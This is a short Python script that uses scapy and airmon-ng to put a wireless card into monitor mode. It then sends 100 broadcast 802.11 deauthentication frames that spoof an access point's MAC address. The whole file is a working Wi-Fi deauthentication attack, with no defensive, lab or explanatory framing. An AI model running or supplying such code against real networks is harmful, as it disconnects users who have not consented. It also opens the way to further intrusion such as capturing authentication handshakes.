from scapy.all import *
import os 


os.system("airmon-ng start wlan0 > testlogs")

# Construct a deauthentication frame
frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66", addr3="11:22:33:44:55:66") / Dot11Deauth()

# Send the frame repeatedly
sendp(frame, iface="wlan0", count=100, inter=0.1)
